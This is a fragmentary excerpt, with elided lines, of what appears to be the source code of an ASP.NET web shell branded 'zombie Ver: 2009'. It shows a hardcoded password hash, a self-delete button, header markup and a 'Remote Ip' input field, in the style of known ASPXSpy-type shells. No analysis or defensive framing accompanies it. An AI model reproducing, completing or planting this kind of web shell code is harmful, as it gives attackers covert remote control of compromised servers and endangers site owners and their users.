...
zombie
*/
public string Password="d1c94b3de6de8ba0d5492e44105ee069";
public string vbhLn="zombie";
public int TdgGU=1;
...
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete zombie?')){Bin_PostBack('hae','');};";
...
<tr class="head">
<td ><span style="float:right;"><a href="" target="_blank">zombie Ver: 2009</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value=""/></td>
